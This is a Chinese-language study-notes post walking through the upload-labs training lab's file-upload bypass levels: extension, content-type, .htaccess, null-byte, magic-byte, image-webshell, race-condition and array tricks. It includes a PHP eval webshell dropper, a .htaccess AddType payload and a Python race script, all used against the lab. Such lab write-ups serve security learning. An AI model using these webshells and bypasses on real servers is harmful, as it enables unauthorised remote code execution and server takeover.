---
title: upload
date: 2024-03-31 19:54:18
tags: 文件上传
categories: 学习笔记
---

### upload1-js绕过

1.验证合法性

当我们上传文件时，如果文件是php格式，就会被拦截，抓包抓不到任何东西

<!-- more -->

![image-20240317170606819](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171706993.png)

2.绕过拦截

为了绕过拦截，我们可以修改文件格式，把php格式修改成jpg格式，此时就成功上传了文件（文件内部是一句话木马，可以创建一个后门，进而就可以操控服务器），通过了前端认证

![image-20240317170835134](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171708232.png)

3.修改文件信息

我们要上传的是一个php文件，因此，我们要修改文件格式，我们在burp进行

修改，再发送出去

![image-20240317171413025](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171714127.png)

4.在新标签页打开上传的图片

我们打开后可以发现图片格式是php，说明我们的一句话木马已成功上传到网站



![image-20240317171823663](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171718701.png)



5.添加url

在蚁剑上添加url，输入密码，就能访问服务器了

![image-20240317190050680](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171900817.png)

------

还可以通过检查代码来进行

![image-20240317190855090](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171908193.png)

我们可以看到这个框架绑定了一个js，我们可以直接return true来绕过，或者禁用js

------

### upload -2 content-type绕过

1.验证合法性

上传php文件，发现可以抓到包，说明验证是在后端进行的

![image-20240317191746465](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171917597.png)

2.判断代码对哪部分进行了验证

上传图片，删掉content-type，如果报错，说明对这部分进行了验证

![image-20240317192130352](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171921410.png)

3.修改格式

![image-20240317192206503](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403171922053.png)

我们发现，php格式的返回类型跟jpeg格式的不一样，我们可以把php的返回类型改成和jpeg的一样就可以上传了

------

### upload-3 特殊后缀绕过

上传php文件发现可以抓包，说明在后端进行的，

提交后发现上传失败，原因是使用了php后缀

![image-20240317203016023](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403172030105.png)

我们检查源码，发现不能上传.asp,.aspx,.php,.jsp后缀文件

因此考虑更改后缀为php3，php5，phphtml等中的一种。

![image-20240317203303257](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403172033328.png)

我们在这里修改为php3，提交后成功上传（这里有个报错点，Apache服务器不对php3以php格式解析，因此要修改配置文件，这里就不演示了，去csdn上搜）

------

### upload-4 .htaccess绕过（黑名单）

![image-20240318210951658](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403182109775.png)

1.检查合法性

通过源码可知，一大堆后缀都被过滤了，但.htaccess后缀没有被过滤，因此可以通过.htaccess配置文件来绕过

在配置文件中输入AddType application/x-httpd-php .jpg .txt，可以将.jpg格式的文件以php格式打开

![image-20240318210658226](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403182107451.png)

2.上传

先上传.htaccess文件，再上传.jpg格式的php文件，再像前几关那样打开图片，连接到服务器



------

### upload5 .user.ini绕过

![image-20240318211121323](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403182111690.png)

.user.ini文件上传前提

.user.ini可以生效，且该上传目录有php文件

------

`auto_prepend_file` 是 PHP 的一个配置选项，可以用来指定一个文件，在每个 PHP 脚本执行之前自动包含该文件的内容。这个文件会在 PHP 脚本的头部被包含执行，即在执行脚本之前会先执行这个文件。

要使用 `auto_prepend_file` 配置选项，需要修改您的 php.ini 配置文件。您可以在 php.ini 文件中添加类似如下的配置：

```
auto_prepend_file = "/path/to/your/prepend/file.php"
```



您需要将 “/path/to/your/prepend/file.php” 替换为您想要在每个 PHP 脚本执行之前自动包含的文件的路径。配置完成后，重启您的 Web 服务器或 PHP-FPM 服务，使配置生效。从那时起，指定的文件将在每个 PHP 脚本执行之前被自动包含执行。

请注意，使用 `auto_prepend_file` 可能会影响整个应用程序的行为，因此请谨慎使用，并确保所包含的文件不会影响到您的应用程序的正常运行。

------

auto_prepend file为自动包含文件

.ini文件里写auto_prepend file=111.jpg （里面有一句话木马）

![image-20240318214540581](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403182145690.png)

剩下的就先上传.ini文件，再上传jpg文件（要等五分钟生效才能用蚁剑连接，所以可以用下面方法）

**点加空格加点绕过**

原理：源代码会检验一遍文件名，去除末尾的.和空格后就不会再次进行检验，使用.php. .的格式，去除.和空格后为格式为php.，可绕过过滤，而系统解析时会自动去除末尾的.，从而上传成功

1.上传php文件

2.在burp上修改php格式



------

### upload-6 大写绕过

原理：文件格式的大小写系统都会自动解析成小写，因此可通过更改文件大写来进行绕过

1.把文件格式改成大写

![image-20240319143913782](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191439854.png)

2.上传

直接上传

3.连接

复制图片链接到蚁剑进行连接



------

### upload-7 空格绕过

原理：在文件格式后加空格，系统在解析文件时会自动删掉空格

1.加空格

先进行抓包，在格式后加几个空格，然后发送

![image-20240319145248036](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191452092.png)

2.连接

复制图片链接到蚁剑进行连接

------

### upload—8后缀加点绕过

跟上关方法一样，只不过加空格变成了加点



------

### upload-9 $DATA绕过

前置知识：**额外数据流**

在·Windows·操作系统中，当你看到文件名后跟着”::\$DATA"时，它表示文件的一个附加数
据流。数据流是一种用于在文件内部存储额外数据的机制。

在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是
Windows·NT·文件系统 (NTFS) 支持在文件内部创建额外的数据流，以存储其他信息。这
些额外的数据流可以通过在文件名后面添加".:$DATA"来访问。“
例如，"1.txt"是一个文件，而"1.txt::\$DATA"是这个文件的一个附加数据流。这样的数据流可
以用于存储文件的元数据、备份信息、标签等。

需要注意的是，大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认的数据流。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口。“

**写入方法**

在文件命令行里输入

echo 内容 >>文件名:额外数据流（可随便命名）

type 文件名1>>文件名2:数据流名 将文件名1的内容写到文件名2的额外数据流中

查看

notepad 文件名:额外数据流    用记事本来访问额外数据流

![image-20240319152655342](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191526468.png)

------

绕过原理：windows系统不允许文件后缀中出现::$DATA,在解析时会自动删除，因此可通过此方式进行绕过

1.抓包改写

上传php文件，在.php后加::$DATA

![image-20240319154545944](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191545041.png)

2.更改网站名

打开图片链接后发现404报错，原因是网站名后面加了::$DATA，而上传的文件把这删掉了，因此我们需要删掉这个，才能打开链接

![image-20240319154928478](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191549499.png)

3.连接

然后通过蚁剑连接服务器

------

### upload-10 点空格点绕过

**点加空格加点绕过**

原理：源代码会检验一遍文件名，去除末尾的.和空格后就不会再次进行检验，使用.php. .的格式，去除.和空格后为格式为php.，可绕过过滤，而系统解析时会自动去除末尾的.，从而上传成功

1.上传php文件

2.在burp上修改php后缀，加上. .绕过

------

### upload-11 双写后缀绕过

![image-20240319160510139](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191605160.png)

原理：源码里的这行代码会把文件后缀替换成空，由于此方式是从左到右进行检查的，因此可以将.php写成.pphphp，这样过滤一遍后就成了.php文件了

1.抓包改写

![image-20240319160750309](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403191607330.png)

2.连接

------

### upload-12  %00截断绕过

**前置知识  **空字符

​	0x00 在编程语言中使用

​	%00 在url编码中使用

空字符后面的东西都不会读取

url编码先将ascii转为16进制，然后再加%。

------

原理：通过%00截断后面的语句，使得页面上传成功

这一关白名单，最终文件的存放位置是以拼接的方式，可以使用%00截断，但需要`php版本<5.3.4`，并且`magic_quotes_gpc`关闭。

1.抓包修改

通过修改提交路径使页面提交的是php文件，而不是jpg文件，为了避免上传失败，需要在.php后加%00，从而截断后面的.jpg文件，使得php文件上传成功，

![image-20240319212313954](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192123103.png)

要是不加%00，就会出现一个文件路径里面还有一个文件，这明显不成立，使得上传报错，所以需要%00截断

![image-20240319212700249](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192127294.png)

2.打开图片链接

打开时会遇到下面情况![image-20240319214033283](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192140326.png)

需要将网站链接php后面那一串删掉才能正确返回页面，然后将修改后的页面url复制到蚁剑上，再连接服务器

------

### upload-13 0x00截断（0x是16进制的标识）

这一关白名单，文件上传路径拼接生成，而且使用了post发送的数据进行拼接，我们可以控制post数据进行0x00截断绕过白名单

> 补充知识：POST不会对里面的数据自动解码，需要在Hex中修改。

1.抓包修改

在upload/后面添加1.php+ ，+号是用来方便修改hex

![image-20240319215632915](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192156962.png)

2.修改hex值

在burp的hex里找到2b(2b是+号的16进制编码)，我们要把它修改为00，再提交

![image-20240319215828929](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192158979.png)

提交后，我们发现页面上传了图片，随后的操作跟上一关相同

------

### upload-14 字节标识绕过

**前置知识**：**图片字节标识**

![image-20240319220301682](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403192203735.png)

utf-8中，一个英文字符占一个字节，中文（含繁体字）占3个字节

通过修改php文件更改后的jpg文件的前两个字节，从而实现绕过

1.修改

当我们直接修改php文件后缀为jpg时，上传会出错，因为此源码是通过对jpg图片的16进制的前2个字节进行验证，因此我们要修改文件的前两个字节为89 50，这是png图片的前两个字节

![image-20240321191729962](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403211917071.png)

方法为先在右下角string里的<前加aa两个字母，这时会发现右上角多出了2个61，将他们修改为89 50，再上传就能上传成功了，但打开图片链接放到蚁剑上进行连接，会发生失败，我们要通过文件包含来进行运行



2.文件包含

![image-20240321192204368](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403211922394.png)

点击文件包含，会跳转到另一个页面，在这个页面通过文件包含来访问图片

在url后面添加?file=upload/4020240321192032.png（图片后面的链接），但依然会报错

![image-20240321192317823](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403211923935.png)

原因是jpg文件里@出现了问题，解决方法是将@和它后面的东西换到下一行去，在保存就能成功了

![image-20240321192546260](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403211925297.png)



### upload-15 图片马绕过

copy  111.png/b+1.php a.png 将1.php中的内容拷进11.png中并重新生成png文件a

在这个命令中，`/b` 是一个参数，用于指示复制操作的模式。在 Windows 系统中，`/b` 参数用于指示 `copy` 命令执行二进制拷贝，即按字节进行拷贝，而不进行任何转换。

1.打开文件夹，通过**文件夹路径**打开cmd

![image-20240321200138695](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403212001738.png)

2.上传a.png，然后通过文件包含运行图片，就成功了

------

### upload-16图片马绕过

跟15关流程一模一样

------

### upload-17 图片的二次渲染

这一关对上传图片进行了判断了`后缀名`、`content-type`，以及利用`imagecreatefromgif`判断是否为`gif`图片，最后再做了一次二次渲染，但是后端二次渲染需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话，使用蚁剑进行连接

上传正常的`GIF`图片下载回显的图片，用`010Editor`编辑器进行对比两个GIF图片内容，找到`相同`的地方（指的是上传前和上传后，两张图片的部分`Hex`仍然保持不变的位置）并插入PHP一句话，上传带有`PHP一句话木马`的GIF图片

------

### upload-18 条件竞争

![image-20240322202250368](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403222022491.png)

从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。

这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。

那还怎么搞？上传上去就被删除了，我还怎么去访问啊。

不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。

我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。

为了更好的演示效果，把一句话木马换一下改为：

<?php fputs(fopen('Tony.php','w'),'<?php @eval($_POST["Tony"])?>');?>

把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个Tony.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么效果。一旦删除了还是无法利用。但是这个办法生成的Tony.php服务器是不会删除的，我们就可以通过蚁剑去链接了。

首先，我们上传PHP文件，用BP拦截
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321170454498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

进行下一步操作前，这里有个小细节，就是`不要`把BP的`拦截功能`关闭了，要一直保持拦截状态以达到测试更好的效果

然后选择`Clear$`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321170626734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

最后建议这里把线程设置高一点

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321170639692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件(即如上图显示的zoe.php文件) 由于隐私原因，IP地址不能放出来，下面的脚本的url地址XXX都是代表IP地址

```
import requests
url = "http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php"
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("OK")
        break
```

接下来我们可以在BP点击开始攻击，

可以看到上传该文件的数据包不停地在进行重放。

在BP攻击的`同时`我们也要运行python脚本，目的就是不停地访问`zoe.php`知道成功访问到为止。当出现`OK`说明访问到了该文件，那么`Tony.php`应该也创建成功了，用蚁剑连一下试试。

------

### upload-19 apache解析漏洞+条件竞争

方法1：用文件包含

方法2： apache解析漏洞+条件竞争

原理：apache解析不了.7z的后缀名，把1.php.7z的文件解析为1.php，因此可通过.7z实现绕过，但在文件夹中生成后会自动重命名，因此需要进行条件竞争，在php文件生成的一瞬间访问它

1.抓包修改

上传2.php（生成小马的文件），在burp上2.php后面加7z

![image-20240323201506355](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403232015432.png)

2.攻击

跟上一关一样

------

### upload 后缀绕过

点绕过

上传php文件，在保存名称处将.jpg改为php.，就能进行上传

![image-20240324141842529](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202403241418612.png)

空格绕过/点空格绕过/点空格点绕过是一样的操作，都是修改保存名称的后缀

------

### upload-21审计+数组后缀绕过

```
这一关白名单
验证过程：
--> 验证上传路径是否存在
--> 验证['upload_file']的content-type是否合法（可以抓包修改）
--> 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）
-->判断file不是数组则使用explode('.', strtolower($file))对file进行切割，将file变为一个数组
--> 判断数组最后一个元素是否合法
--> 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name
--> 上传文件
```

```
补充知识：
explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。
end(array)函数，输出数组中的当前元素和最后一个元素的值。
reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值
count(array)函数，计算数组中的单元数目，或对象中的属性个数
```

首先准备PHP一句话木马

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021032117224664.png)

然后上传用BP来拦截并改包（效果如下面图二）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321172305338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

```
我们要改的就是下面的要求

修改content-type
修改POST参数为数组类型，索引[0]为`upload-20.php`，索引[2]为`jpg|png|gif`。
只要第二个索引`不为1`，$file[count($file) - 1]就等价于$file[2-1]，值为空
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210321172610126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)

然后就点击放包


复制图片地址，用蚁剑进行连接

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021032117270367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzU5ODQwOQ==,size_16,color_FFFFFF,t_70)
